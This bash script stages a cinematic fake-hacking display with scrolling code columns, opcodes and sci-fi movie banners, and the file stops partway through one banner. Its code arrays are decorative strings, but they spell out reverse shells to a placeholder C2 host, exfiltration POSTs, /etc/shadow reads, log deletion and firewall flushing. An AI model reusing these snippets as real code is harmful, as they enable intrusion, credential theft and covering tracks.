#!/bin/bash
# hack-sim.sh — Cinematic hacking simulation for council machines
# Usage: hack-sim.sh [hostname] [ip] [art_seed 0-7]
# Each machine gets unique visuals, quotes, data, and audio

HOST="${1:-$(hostname)}"
IP="${2:-127.0.0.1}"
ART_SEED="${3:-0}"
USER_NAME="$(whoami)"
export TERM="${TERM:-xterm-256color}"
COLS=$(tput cols 2>/dev/null || echo 80)

# ══════════════════════════════════════════════
# TERMINAL COLORS
# ══════════════════════════════════════════════
G='\033[1;32m'   # Green bold
R='\033[1;31m'   # Red bold
Y='\033[1;33m'   # Yellow bold
C='\033[1;36m'   # Cyan bold
W='\033[1;37m'   # White bold
D='\033[0;32m'   # Green dim
DG='\033[2;37m'  # Dim gray
M='\033[1;35m'   # Magenta bold
N='\033[0m'      # Reset
BG='\033[40m'    # Black background

clear
printf '\033[?25l'  # Hide cursor

# Play modem handshake sound in background (with per-machine variation)
if [ -f /tmp/modem-sound.py ]; then
    python3 /tmp/modem-sound.py "$ART_SEED" &>/dev/null &
fi

# ══════════════════════════════════════════════
# HELPER FUNCTIONS
# ══════════════════════════════════════════════

typeit() {
    local text="$1"
    local delay="${2:-0.02}"
    for ((i=0; i<${#text}; i++)); do
        printf '%s' "${text:$i:1}"
        sleep "$delay"
    done
    echo
}

randhex() {
    cat /dev/urandom | LC_ALL=C tr -dc 'a-f0-9' | head -c "$1"
}

center() {
    local text="$1"
    local len=${#text}
    local pad=$(( (COLS - len) / 2 ))
    printf "%${pad}s%s\n" "" "$text"
}

draw_hline() {
    local char="${1:-═}"
    local len="${2:-$COLS}"
    printf '%*s\n' "$len" '' | tr ' ' "$char"
}

progress_bar() {
    local label="$1"
    local target="${2:-100}"
    local color="${3:-$G}"
    local width=30
    for ((pct=0; pct<=target; pct+=3)); do
        local filled=$((pct * width / 100))
        local empty=$((width - filled))
        printf "\r  ${DG}%-20s${N} ${color}[" "$label"
        printf '%0.s█' $(seq 1 $filled 2>/dev/null) 2>/dev/null
        printf '%0.s░' $(seq 1 $empty 2>/dev/null) 2>/dev/null
        printf "]${N} ${W}%3d%%${N}" "$pct"
        sleep 0.03
    done
    printf "\r  ${DG}%-20s${N} ${color}[" "$label"
    printf '%0.s█' $(seq 1 $width)
    printf "]${N} ${G}%3d%% ✓${N}\n" 100
}

# Code snippets per language — each machine uses a different language
ASM_LINES=(
    "  MOV AX, 0x4C00"
    "  INT 21h"
    "  PUSH EBP"
    "  MOV EBP, ESP"
    "  SUB ESP, 0x40"
    "  XOR EAX, EAX"
    "  LEA EDX, [EBP-0x20]"
    "  CMP BYTE [ESI], 0"
    "  JNZ .loop_start"
    "  CALL _inject_payload"
    "  RET"
    "  POP EBX"
    "  NOP"
    "  JMP SHORT .next"
    "  MOV ECX, [EBP+8]"
    "  TEST EAX, EAX"
    "  SHL EDX, 4"
    "  AND EAX, 0xFF"
    "  OR ECX, EDX"
    "  RETN 0x10"
    "  DB 0x90, 0x90, 0x90"
    "  MOV DWORD [ESP], offset shellcode"
    "  LOOP .decrypt_block"
    "  XCHG EAX, EDX"
    "  INC ESI"
    "  DEC ECX"
    "  SHR EAX, 1"
    "  ADC EDX, 0"
    "  STOSB"
    "  REP MOVSB"
)

C_LINES=(
    "  void *buf = mmap(NULL, 4096, 7, 0x22, -1, 0);"
    "  memcpy(buf, shellcode, sizeof(shellcode));"
    "  ((void(*)())buf)();"
    "  int fd = socket(AF_INET, SOCK_STREAM, 0);"
    "  connect(fd, (struct sockaddr*)&sa, sizeof(sa));"
    "  dup2(fd, STDIN_FILENO);"
    "  execve(\"/bin/sh\", args, NULL);"
    "  char *key = getenv(\"API_SECRET\");"
    "  if (ptrace(PTRACE_TRACEME, 0) < 0) exit(1);"
    "  fork() && wait(NULL);"
    "  setsid();"
    "  signal(SIGCHLD, SIG_IGN);"
    "  while(recv(sock, &cmd, 1, 0) > 0) {"
    "  pid_t pid = fork();"
    "  struct stat st;"
    "  fstat(fd, &st);"
    "  unsigned char *mapped = mmap(0, st.st_size,"
    "      PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);"
    "  for(int i=0; i<len; i++) buf[i] ^= key[i%klen];"
    "  sendto(sock, packet, pktlen, 0,"
    "      (struct sockaddr*)&dest, sizeof(dest));"
    "  close(fd);"
    "  free(buf);"
    "  return 0;"
    "  #include <sys/ptrace.h>"
    "  #define PAYLOAD_SZ 0x200"
    "  typedef struct { int type; char data[256]; } msg_t;"
    "  ssize_t n = read(fd, buf, sizeof(buf));"
    "  write(STDOUT_FILENO, response, strlen(response));"
    "  chmod(\"/tmp/.backdoor\", 0755);"
)

CPP_LINES=(
    "  auto conn = std::make_unique<SSHClient>(host, 22);"
    "  conn->authenticate(stolen_key);"
    "  auto proc = conn->exec(\"cat /etc/shadow\");"
    "  std::vector<uint8_t> payload(4096);"
    "  std::copy(shellcode.begin(), shellcode.end(),"
    "            payload.begin());"
    "  auto exfil = new DataExfiltrator(c2_server);"
    "  exfil->upload(database_dump, AES_256_GCM);"
    "  delete exfil;"
    "  class RootKit : public KernelModule {"
    "    void inject() override {"
    "      hook_syscall(SYS_open, &fake_open);"
    "    }"
    "  };"
    "  std::thread(scan_network, subnet).detach();"
    "  catch (std::exception& e) {"
    "    log_error(e.what());"
    "  }"
    "  template<typename T>"
    "  T decrypt(const std::vector<uint8_t>& cipher) {"
    "    return AES::decrypt<T>(cipher, master_key);"
    "  }"
    "  std::mutex mtx;"
    "  std::lock_guard<std::mutex> lock(mtx);"
    "  for (auto& target : network_hosts) {"
    "    if (target.is_vulnerable()) exploit(target);"
    "  }"
    "  std::filesystem::remove_all(\"/var/log\");"
    "  auto fut = std::async(std::launch::async, crack_hash);"
    "  std::cout << \"[+] Persistence installed\" << std::endl;"
    "  return EXIT_SUCCESS;"
)

PASCAL_LINES=(
    "  program ExploitFramework;"
    "  uses SysUtils, Sockets, Classes;"
    "  var sock: TSocket;"
    "  begin"
    "    sock := fpSocket(AF_INET, SOCK_STREAM, 0);"
    "    fpConnect(sock, @addr, sizeof(addr));"
    "    WriteLn('ACCESS GRANTED');"
    "    AssignFile(f, '/etc/passwd');"
    "    Reset(f);"
    "    while not EOF(f) do begin"
    "      ReadLn(f, line);"
    "      fpSend(sock, @line[1], Length(line), 0);"
    "    end;"
    "    CloseFile(f);"
    "    fpClose(sock);"
    "  end."
    "  procedure InjectShellcode(addr: Pointer);"
    "  var p: PByte;"
    "  begin"
    "    p := VirtualAlloc(nil, 4096, $3000, $40);"
    "    Move(shellcode[0], p^, Length(shellcode));"
    "    asm CALL p end;"
    "  end;"
    "  function DecryptPayload(data: TBytes): TBytes;"
    "  type TKeyring = record"
    "    master: array[0..31] of Byte;"
    "    iv: array[0..15] of Byte;"
    "  end;"
    "  if FileExists('/tmp/.persistence') then"
    "    raise Exception.Create('Rootkit active');"
    "  Result := XorCrypt(data, key);"
)

JS_LINES=(
    "  const net = require('net');"
    "  const sock = new net.Socket();"
    "  sock.connect(4444, c2Server, () => {"
    "    const sh = spawn('/bin/sh', ['-i']);"
    "    sh.stdout.pipe(sock);"
    "    sock.pipe(sh.stdin);"
    "  });"
    "  const crypto = require('crypto');"
    "  const key = crypto.randomBytes(32);"
    "  const cipher = crypto.createCipheriv('aes-256-gcm',"
    "    key, iv);"
    "  let encrypted = cipher.update(stolen_data, 'utf8',"
    "    'hex');"
    "  encrypted += cipher.final('hex');"
    "  await fetch(c2 + '/exfil', {"
    "    method: 'POST',"
    "    body: JSON.stringify({ data: encrypted }),"
    "    headers: { 'X-Bot-Id': botId }"
    "  });"
    "  const fs = require('fs');"
    "  fs.readFileSync('/etc/shadow', 'utf8');"
    "  process.env.API_KEY = undefined;"
    "  const { execSync } = require('child_process');"
    "  execSync('iptables -F');"
    "  console.log('[+] Firewall flushed');"
    "  setInterval(() => beacon(c2), 30000);"
    "  module.exports = { exploit, persist, clean };"
    "  async function* scanPorts(host) {"
    "    for (let p = 1; p < 65536; p++) yield probe(host, p);"
    "  }"
)

LINGO_LINES=(
    "  on startMovie"
    "    global gTarget, gPayload"
    "    set gTarget = the machineType"
    "    put \"BREACH ACTIVE\" into field \"status\""
    "  end"
    "  on mouseDown"
    "    set the ink of sprite 1 to 36"
    "    puppetSound \"modem_handshake\""
    "  end"
    "  on enterFrame"
    "    if the timer > 60 then"
    "      go to frame \"exfiltrate\""
    "    end if"
    "  end"
    "  on exitFrame"
    "    set data = getProp(gStolenKeys, #ssh)"
    "    sendData(gC2server, data)"
    "    go to the frame"
    "  end"
    "  put the number of chars in field \"passwd\" into n"
    "  repeat with i = 1 to n"
    "    put charToNum(char i of field \"passwd\") into c"
    "    put numToChar(bitXor(c, 42)) after result"
    "  end repeat"
    "  set the locH of sprite 10 to random(800)"
    "  set the visible of member \"rootkit\" to TRUE"
    "  set the text of member \"log\" to RETURN & \"[+] DONE\""
    "  on inject target"
    "    do \"set x = \" & target & \".payload\""
    "  end"
)

# Pick language per machine
ALL_CODE_LINES=()
case $((ART_SEED % 6)) in
    0) ALL_CODE_LINES=("${ASM_LINES[@]}") ;;
    1) ALL_CODE_LINES=("${C_LINES[@]}") ;;
    2) ALL_CODE_LINES=("${CPP_LINES[@]}") ;;
    3) ALL_CODE_LINES=("${PASCAL_LINES[@]}") ;;
    4) ALL_CODE_LINES=("${JS_LINES[@]}") ;;
    5) ALL_CODE_LINES=("${LINGO_LINES[@]}") ;;
esac
CODE_COUNT=${#ALL_CODE_LINES[@]}

# Secondary language for variety (offset by 3)
ALL_CODE_LINES2=()
case $(( (ART_SEED + 3) % 6 )) in
    0) ALL_CODE_LINES2=("${ASM_LINES[@]}") ;;
    1) ALL_CODE_LINES2=("${C_LINES[@]}") ;;
    2) ALL_CODE_LINES2=("${CPP_LINES[@]}") ;;
    3) ALL_CODE_LINES2=("${PASCAL_LINES[@]}") ;;
    4) ALL_CODE_LINES2=("${JS_LINES[@]}") ;;
    5) ALL_CODE_LINES2=("${LINGO_LINES[@]}") ;;
esac
CODE2_COUNT=${#ALL_CODE_LINES2[@]}

# Language metadata: name, creator, year
LANG_INFO=(
    "Assembly|Various (Intel, AT&T)|1949"
    "C|Dennis Ritchie (Bell Labs)|1972"
    "C++|Bjarne Stroustrup|1985"
    "Pascal|Niklaus Wirth|1970"
    "JavaScript|Brendan Eich (Netscape)|1995"
    "Lingo|John H. Thompson (Macromedia)|1988"
)

# Modern languages for third column
LANG3_INFO=(
    "Rust|Graydon Hoare (Mozilla)|2010"
    "Go|Rob Pike, Ken Thompson (Google)|2009"
    "Swift|Chris Lattner (Apple)|2014"
    "Kotlin|JetBrains|2011"
    "TypeScript|Anders Hejlsberg (Microsoft)|2012"
    "Zig|Andrew Kelley|2016"
    "Python|Guido van Rossum|1991"
    "Ruby|Yukihiro Matsumoto|1995"
)

RUST_LINES=(
    "  fn main() {"
    "    let payload = vec![0u8; 4096];"
    "    unsafe { std::ptr::copy(shellcode.as_ptr(),"
    "      payload.as_mut_ptr(), shellcode.len()) };"
    "    let sock = TcpStream::connect(c2)?;"
    "    let mut buf = [0u8; 1024];"
    "    loop { match sock.read(&mut buf) {"
    "      Ok(n) => process(&buf[..n]),"
    "      Err(_) => break, } }"
    "    std::process::Command::new(\"/bin/sh\")"
    "      .stdin(Stdio::from(sock.try_clone()?))"
    "      .stdout(Stdio::from(sock.try_clone()?))"
    "      .spawn()?;"
    "    let key: [u8; 32] = rand::random();"
    "    let cipher = Aes256Gcm::new(&key.into());"
    "    let encrypted = cipher.encrypt(&nonce, data)?;"
    "    fs::remove_dir_all(\"/var/log\")?;"
    "    eprintln!(\"[+] Tracks cleared\");"
    "    impl Drop for Rootkit {"
    "      fn drop(&mut self) { self.cleanup(); }"
    "    }"
    "    #[derive(Debug)] struct Exploit {"
    "      target: String,"
    "      payload: Vec<u8>,"
    "    }"
    "    pub async fn exfiltrate(data: &[u8]) -> Result<()> {"
    "      let client = reqwest::Client::new();"
    "      client.post(C2_URL).body(data.to_vec()).send().await?;"
    "      Ok(())"
    "    }"
)

GO_LINES=(
    "  func main() {"
    "    conn, _ := net.Dial(\"tcp\", c2+\":4444\")"
    "    cmd := exec.Command(\"/bin/sh\")"
    "    cmd.Stdin = conn"
    "    cmd.Stdout = conn"
    "    cmd.Stderr = conn"
    "    cmd.Run()"
    "    key := make([]byte, 32)"
    "    rand.Read(key)"
    "    block, _ := aes.NewCipher(key)"
    "    gcm, _ := cipher.NewGCM(block)"
    "    nonce := make([]byte, gcm.NonceSize())"
    "    encrypted := gcm.Seal(nonce, nonce, data, nil)"
    "    http.Post(c2+\"/exfil\", \"application/octet-stream\","
    "      bytes.NewReader(encrypted))"
    "    os.RemoveAll(\"/var/log\")"
    "    go func() {"
    "      for range time.Tick(30 * time.Second) {"
    "        beacon(c2)"
    "      }"
    "    }()"
    "    type Exploit struct {"
    "      Target  string \`json:\"target\"\`"
    "      Payload []byte \`json:\"payload\"\`"
    "    }"
    "    scanner := bufio.NewScanner(conn)"
    "    for scanner.Scan() {"
    "      exec.Command(\"sh\", \"-c\", scanner.Text()).Run()"
    "    }"
    "    defer conn.Close()"
)

SWIFT_LINES=(
    "  import Foundation"
    "  let task = Process()"
    "  task.executableURL = URL(fileURLWithPath: \"/bin/sh\")"
    "  let pipe = Pipe()"
    "  task.standardOutput = pipe"
    "  try task.run()"
    "  let data = pipe.fileHandleForReading.readDataToEndOfFile()"
    "  let sock = try Socket.create(family: .inet)"
    "  try sock.connect(to: c2, port: 4444)"
    "  guard let key = SymmetricKey(size: .bits256) else { return }"
    "  let sealed = try AES.GCM.seal(payload, using: key)"
    "  let url = URL(string: \"\\(c2)/exfil\")!"
    "  var req = URLRequest(url: url)"
    "  req.httpMethod = \"POST\""
    "  req.httpBody = sealed.combined"
    "  URLSession.shared.dataTask(with: req).resume()"
    "  try FileManager.default.removeItem(atPath: \"/var/log\")"
    "  class Rootkit: NSObject {"
    "    @objc dynamic func inject() {"
    "      let hook = dlsym(RTLD_DEFAULT, \"open\")"
    "      // swizzle syscall table"
    "    }"
    "  }"
    "  DispatchQueue.global().async {"
    "    while true {"
    "      Thread.sleep(forTimeInterval: 30)"
    "      beacon(c2: server)"
    "    }"
    "  }"
)

KOTLIN_LINES=(
    "  fun main() {"
    "    val socket = Socket(c2, 4444)"
    "    val proc = Runtime.getRuntime().exec(\"/bin/sh\")"
    "    val input = socket.getInputStream()"
    "    val output = socket.getOutputStream()"
    "    proc.inputStream.copyTo(output)"
    "    input.copyTo(proc.outputStream)"
    "    val key = KeyGenerator.getInstance(\"AES\").apply {"
    "      init(256) }.generateKey()"
    "    val cipher = Cipher.getInstance(\"AES/GCM/NoPadding\")"
    "    cipher.init(Cipher.ENCRYPT_MODE, key)"
    "    val encrypted = cipher.doFinal(payload)"
    "    val client = OkHttpClient()"
    "    val request = Request.Builder()"
    "      .url(\"\$c2/exfil\")"
    "      .post(encrypted.toRequestBody())"
    "      .build()"
    "    client.newCall(request).execute()"
    "    File(\"/var/log\").deleteRecursively()"
    "    data class Exploit("
    "      val target: String,"
    "      val payload: ByteArray"
    "    )"
    "    GlobalScope.launch {"
    "      while(true) {"
    "        delay(30_000)"
    "        beacon(c2)"
    "      }"
    "    }"
)

TYPESCRIPT_LINES=(
    "  import { createConnection } from 'net';"
    "  const conn = createConnection(4444, c2);"
    "  const shell = spawn('/bin/sh', ['-i']);"
    "  shell.stdout.pipe(conn);"
    "  conn.pipe(shell.stdin);"
    "  interface Exploit {"
    "    target: string;"
    "    payload: Buffer;"
    "    timestamp: number;"
    "  }"
    "  const key = crypto.randomBytes(32);"
    "  const iv = crypto.randomBytes(16);"
    "  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);"
    "  const encrypted: Buffer = Buffer.concat(["
    "    cipher.update(data), cipher.final()]);"
    "  await axios.post<void>(\`\${c2}/exfil\`, encrypted, {"
    "    headers: { 'Content-Type': 'application/octet-stream' }"
    "  });"
    "  const scanPorts = async (host: string): Promise<number[]> => {"
    "    const open: number[] = [];"
    "    for (let p = 1; p < 65536; p++) {"
    "      if (await probe(host, p)) open.push(p);"
    "    }"
    "    return open;"
    "  };"
    "  fs.rmSync('/var/log', { recursive: true, force: true });"
    "  type C2Response = { cmd: string; args: string[] };"
    "  setInterval(() => beacon(c2), 30_000);"
)

ZIG_LINES=(
    "  const std = @import(\"std\");"
    "  pub fn main() !void {"
    "    const sock = try std.net.tcpConnectToHost(c2, 4444);"
    "    defer sock.close();"
    "    var buf: [4096]u8 = undefined;"
    "    while (true) {"
    "      const n = try sock.read(&buf);"
    "      if (n == 0) break;"
    "      try process(buf[0..n]);"
    "    }"
    "    const key = std.crypto.random.bytes(32);"
    "    var enc: [data.len]u8 = undefined;"
    "    std.crypto.aead.encrypt(&enc, data, key);"
    "    const alloc = std.heap.page_allocator;"
    "    var payload = try alloc.alloc(u8, 4096);"
    "    defer alloc.free(payload);"
    "    @memcpy(payload, shellcode);"
    "    std.fs.deleteTree(\"/var/log\") catch {};"
    "    std.log.info(\"[+] Tracks cleared\", .{});"
    "    const Exploit = struct {"
    "      target: []const u8,"
    "      payload: []u8,"
    "    };"
    "    try std.os.execve(\"/bin/sh\", &.{}, environ);"
    "    var timer = try std.time.Timer.start();"
    "    std.time.sleep(30 * std.time.ns_per_s);"
    "    try beacon(c2);"
)

PYTHON_LINES=(
    "  import socket, subprocess, os"
    "  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
    "  s.connect((c2, 4444))"
    "  os.dup2(s.fileno(), 0)"
    "  os.dup2(s.fileno(), 1)"
    "  subprocess.call(['/bin/sh', '-i'])"
    "  from cryptography.fernet import Fernet"
    "  key = Fernet.generate_key()"
    "  f = Fernet(key)"
    "  encrypted = f.encrypt(stolen_data)"
    "  requests.post(f'{c2}/exfil', data=encrypted)"
    "  import shutil"
    "  shutil.rmtree('/var/log', ignore_errors=True)"
    "  class Rootkit:"
    "    def __init__(self, target: str):"
    "      self.target = target"
    "      self.payload = b'\\x90' * 4096"
    "    def inject(self) -> bool:"
    "      ctypes.memmove(addr, self.payload, len(self.payload))"
    "      return True"
    "  async def beacon(c2: str) -> None:"
    "    while True:"
    "      await asyncio.sleep(30)"
    "      async with aiohttp.ClientSession() as s:"
    "        await s.get(f'{c2}/ping')"
    "  with open('/etc/shadow', 'r') as f:"
    "    for line in f: exfil(line.strip())"
)

RUBY_LINES=(
    "  require 'socket'"
    "  sock = TCPSocket.new(c2, 4444)"
    "  exec '/bin/sh', in: sock, out: sock, err: sock"
    "  require 'openssl'"
    "  cipher = OpenSSL::Cipher::AES256.new(:GCM)"
    "  cipher.encrypt"
    "  key = cipher.random_key"
    "  encrypted = cipher.update(data) + cipher.final"
    "  Net::HTTP.post(URI(\"#{c2}/exfil\"), encrypted)"
    "  FileUtils.rm_rf('/var/log')"
    "  class Exploit"
    "    attr_accessor :target, :payload"
    "    def initialize(target)"
    "      @target = target"
    "      @payload = \"\\x90\" * 4096"
    "    end"
    "    def run!"
    "      inject(@payload)"
    "      puts '[+] Exploit successful'"
    "    end"
    "  end"
    "  Thread.new do"
    "    loop { sleep(30); beacon(c2) }"
    "  end"
    "  File.readlines('/etc/shadow').each do |line|"
    "    exfiltrate(line.chomp)"
    "  end"
)

# Third column: modern language per machine
ALL_CODE_LINES3=()
case $((ART_SEED % 8)) in
    0) ALL_CODE_LINES3=("${RUST_LINES[@]}") ;;
    1) ALL_CODE_LINES3=("${GO_LINES[@]}") ;;
    2) ALL_CODE_LINES3=("${SWIFT_LINES[@]}") ;;
    3) ALL_CODE_LINES3=("${KOTLIN_LINES[@]}") ;;
    4) ALL_CODE_LINES3=("${TYPESCRIPT_LINES[@]}") ;;
    5) ALL_CODE_LINES3=("${ZIG_LINES[@]}") ;;
    6) ALL_CODE_LINES3=("${PYTHON_LINES[@]}") ;;
    7) ALL_CODE_LINES3=("${RUBY_LINES[@]}") ;;
esac
CODE3_COUNT=${#ALL_CODE_LINES3[@]}
LANG3_IDX=$((ART_SEED % 8))

LANG1_IDX=$((ART_SEED % 6))
LANG2_IDX=$(( (ART_SEED + 3) % 6 ))
CODE_IDX=0
TRANSITION_COUNT=0

matrix_transition() {
    # Full-screen code rain with language header
    local ROWS=150
    local colors=("${G}" "${D}" "${DG}" "${C}" "${G}" "${D}")

    # Alternate primary/secondary language each transition
    local lang_idx
    if (( TRANSITION_COUNT % 2 == 0 )); then
        lang_idx=$LANG1_IDX
    else
        lang_idx=$LANG2_IDX
    fi
    TRANSITION_COUNT=$((TRANSITION_COUNT + 1))

    IFS='|' read -r lang1_name lang1_creator lang1_year <<< "${LANG_INFO[$LANG1_IDX]}"
    IFS='|' read -r lang2_name lang2_creator lang2_year <<< "${LANG_INFO[$LANG2_IDX]}"
    IFS='|' read -r lang3_name lang3_creator lang3_year <<< "${LANG3_INFO[$LANG3_IDX]}"

    # Lingo is always the middle column (column 3)
    local lingo_name="Lingo"
    local lingo_info="John H. Thompson, 1988-2017"

    # Use full terminal width: 5 columns + 4 separators of " │ " (3 chars each = 12)
    local CW=$(( (COLS - 12) / 5 ))
    local HW=$((CW))

    # Build dynamic header with spacing matching columns
    local hline=""
    local hcw=$((CW + 2))
    for ((i=0; i<hcw; i++)); do hline+="═"; done

    echo
    echo -e "${W}╔${hline}╦${hline}╦${hline}╦${hline}╦${hline}╗${N}"
    printf  "${W}║${N} ${C}%-$((HW+1))s${W}║${N} ${C}%-$((HW+1))s${W}║${N} ${Y}%-$((HW+1))s${W}║${N} ${C}%-$((HW+1))s${W}║${N} ${DG}%-$((HW+1))s${W}║${N}\n" "${lang1_name}" "${lang2_name}" "${lingo_name}" "${lang3_name}" "Machine Code"
    printf  "${W}║${N} ${DG}%-$((HW+1))s${W}║${N} ${DG}%-$((HW+1))s${W}║${N} ${DG}%-$((HW+1))s${W}║${N} ${DG}%-$((HW+1))s${W}║${N} ${DG}%-$((HW+1))s${W}║${N}\n" "${lang1_creator}" "${lang2_creator}" "${lingo_info}" "${lang3_creator}" "x86-64 opcodes"
    printf  "${W}║${N} ${DG}%-$((HW+1))s${W}║${N} ${DG}%-$((HW+1))s${W}║${N} ${DG}%-$((HW+1))s${W}║${N} ${DG}%-$((HW+1))s${W}║${N} ${DG}%-$((HW+1))s${W}║${N}\n" "${lang1_year}" "${lang2_year}" "Macromedia" "${lang3_year}" "1978-present"
    echo -e "${W}╚${hline}╩${hline}╩${hline}╩${hline}╩${hline}╝${N}"
    echo
    sleep 0.5

    local code2_idx=$((CODE_IDX + 17))
    local code3_idx=$((CODE_IDX + 7))
    local lingo_idx=$((CODE_IDX + 11))
    local LINGO_COUNT=${#LINGO_LINES[@]}

    # x86-64 opcodes
    local -a OPCODES=(
        "55 48 89 e5 48 83"
        "ec 40 c7 45 fc 00"
        "48 8d 75 c0 bf 01"
        "e8 3a ff ff ff 89"
        "83 f8 00 0f 84 2a"
        "48 8b 45 f8 48 89"
        "b8 01 00 00 00 cd"
        "31 c0 31 db 31 c9"
        "0f 05 48 89 c7 48"
        "ff 15 2a 00 00 00"
        "48 c7 c0 3b 00 00"
        "48 89 e7 0f 05 90"
        "53 51 52 56 57 55"
        "5d 5f 5e 5a 59 5b"
        "e9 4c 01 00 00 90"
        "f3 0f 1e fa 55 48"
        "c3 90 90 90 90 90"
        "48 b8 2f 62 69 6e"
        "2f 73 68 00 50 48"
        "89 e7 31 f6 31 d2"
        "41 ba ff ff ff 7f"
        "49 89 ca 0f 05 48"
        "83 ec 08 48 89 3c"
        "24 e8 00 00 00 00"
        "48 31 ff 48 f7 e6"
        "eb fe 90 cc cc cc"
        "48 8d 0d 00 00 00"
        "ba 00 04 00 00 be"
        "01 00 00 00 31 ff"
        "44 89 e0 48 98 48"
    )
    local OP_COUNT=${#OPCODES[@]}
    local op_idx=$((ART_SEED * 3))

    # Fixed distinct color per column — always visible on any background
    local COL1_C="${G}"    # Green: classic lang 1
    local COL2_C="${C}"    # Cyan: classic lang 2
    local COL3_C="${Y}"    # Yellow: Lingo (always)
    local COL4_C="${M}"    # Magenta: modern lang
    local COL5_C="${R}"    # Red: machine code

    for ((l=0; l<ROWS; l++)); do

        # Col 1: classic language 1
        local col1="${ALL_CODE_LINES[$((CODE_IDX % CODE_COUNT))]}"
        CODE_IDX=$((CODE_IDX + 1))

        # Col 2: classic language 2
        local col2="${ALL_CODE_LINES2[$((code2_idx % CODE2_COUNT))]}"
        code2_idx=$((code2_idx + 1))

        # Col 3: Lingo (always)
        local col3="${LINGO_LINES[$((lingo_idx % LINGO_COUNT))]}"
        lingo_idx=$((lingo_idx + 1))

        # Col 4: modern language
        local col4="${ALL_CODE_LINES3[$((code3_idx % CODE3_COUNT))]}"
        code3_idx=$((code3_idx + 1))

        # Col 5: machine code opcodes
        local col5="${OPCODES[$((op_idx % OP_COUNT))]}"
        op_idx=$((op_idx + 1))

        printf "${COL1_C}%-${CW}s ${DG}│ ${COL2_C}%-${CW}s ${DG}│ ${COL3_C}%-${CW}s ${DG}│ ${COL4_C}%-${CW}s ${DG}│ ${COL5_C}%-${CW}s${N}\n" "${col1:0:$CW}" "${col2:0:$CW}" "${col3:0:$CW}" "${col4:0:$CW}" "${col5:0:$CW}"
        sleep 0.02
    done
}

log_line() {
    local color="${1:-$D}"
    local text="$2"
    echo -e "  ${DG}[$(date '+%H:%M:%S')]${N} ${color}${text}${N}"
    sleep 0.3
}

# ══════════════════════════════════════════════
# SCI-FI MOVIE QUOTES — big ASCII text banners
# ══════════════════════════════════════════════

show_quote_0() {
    # WarGames (1983) — WOPR computer terminal
    echo -e "${G}"
    cat << 'Q'
      ╔═══════════════════════════════════════════════════════════╗
      ║                                                           ║
      ║    ██╗    ██╗ ██████╗ ██████╗ ██████╗                     ║
      ║    ██║    ██║██╔═══██╗██╔══██╗██╔══██╗                    ║
      ║    ██║ █╗ ██║██║   ██║██████╔╝██████╔╝                    ║
      ║    ██║███╗██║██║   ██║██╔═══╝ ██╔══██╗                    ║
      ║    ╚███╔███╔╝╚██████╔╝██║     ██║  ██║                    ║
      ║     ╚══╝╚══╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝                   ║
      ║                                                           ║
      ║         ┌──────────────────────────────────┐              ║
      ║         │                                  │              ║
      ║         │  GREETINGS, PROFESSOR FALKEN.    │              ║
      ║         │                                  │              ║
      ║         │  SHALL WE PLAY A GAME?  _        │              ║
      ║         │                                  │              ║
      ║         └──────────────────────────────────┘              ║
      ║                                                           ║
      ║   > GLOBAL THERMONUCLEAR WAR                              ║
      ║                                                           ║
      ╚═══════════════════════════════════════════════════════════╝
Q
    echo -e "${N}"
}

show_quote_1() {
    # 2001: A Space Odyssey — HAL 9000 eye
    echo -e "${R}"
    cat << 'Q'

                        ████████████████
                   ████████████████████████
                █████████████████████████████
              ██████████████████████████████████
            ████████████████████████████████████
           ██████████████     ██████████████████
          ████████████   ████   ████████████████
          ███████████  ████████  ███████████████
          ███████████  ████████  ███████████████
          ████████████   ████   ████████████████
           ██████████████     ██████████████████
            ████████████████████████████████████
              ██████████████████████████████████
                █████████████████████████████
                   ████████████████████████
                        ████████████████

                   H   A   L       9 0 0 0

Q
    echo -e "${N}"
}

show_quote_2() {
    # The Terminator — Robot skull / endoskeleton face
    echo -e "${R}"
    cat << 'Q'

                     ╔═══════════════╗
                  ╔══╝               ╚══╗
                ╔╝   ┌─────┐ ┌─────┐   ╚╗
               ║     │ ◉   │ │   ◉ │     ║
               ║     └──┬──┘ └──┬──┘     ║
               ║        │       │        ║
                ╚╗      └───┬───┘      ╔╝
                  ║     ┌───┴───┐     ║
                  ║     │ ▓▓▓▓▓ │     ║
                  ╚╗    │▓▓▓▓▓▓▓│    ╔╝
                    ╚═══╧═══════╧═══╝
                     │ │ │ │ │ │ │
                     ╘═╧═╧═╧═╧═╧═╛

              C Y B E R D Y N E   S Y S T E M S
                  Model  T - 8 0 0   v2.4

Q
    echo -e "${N}"
}

show_quote_3() {
    # Blade Runner — Cityscape with rain
    echo -e "${C}"
    cat << 'Q'

    ╱╲     │  ║║  │   ╱╲          ╱╲    │
   ╱  ╲    │  ║║  │  ╱  ╲   │    ╱  ╲   │
  ╱    ╲   │  ║║  │ ╱    ╲  │   ╱    ╲  │    ╱╲
 ╱  ╔═╗ ╲  │  ║║  │╱  ╔═╗ ╲ │  ╱  ╔═╗ ╲│   ╱  ╲
╱   ║ ║  ╲ │  ║║  │   ║ ║  ╲│ ╱   ║ ║  ╲   ╱    ╲
║   ║█║   ║│  ║║  ║   ║█║   ║│║   ║█║   ║ ╱  ╔═╗ ╲
║   ║█║   ║│  ║║  ║   ║█║   ║│║   ║█║   ║╱   ║█║  ╲
║   ║█║   ║│  ║║  ║   ║█║   ║│║   ║█║   ║    ║█║   ║
║   ║█║   ║│  ║║  ║   ║█║   ║│║   ║█║   ║    ║█║   ║
╚═══╩═╩═══╝└──╨╨──╚═══╩═╩═══╝└╚═══╩═╩═══╝════╩═╩═══╝
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

                 L O S   A N G E L E S
                   N o v e m b e r
                       2 0 1 9

Q
    echo -e "${N}"
}

show_quote_4() {
    # Alien — Nostromo ship corridor / motion tracker
    echo -e "${G}"
    cat << 'Q'

      ┌──────────────────────────────────────────┐
      │          M O T I O N   T R A C K E R     │
      │                                          │
      │              .  ╱  .                     │
      │           .   ╱     .                    │
      │         .    ╱   ◉    .                  │
      │        . ───╱─────────── .               │
      │         .  ╱          .                  │
      │           ╱  .     .                     │
      │          ╱     . .                       │
      │                                          │
      │  ▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░  RANGE: 20m │
      │  SIGNAL:  ████████░░  STRONG             │
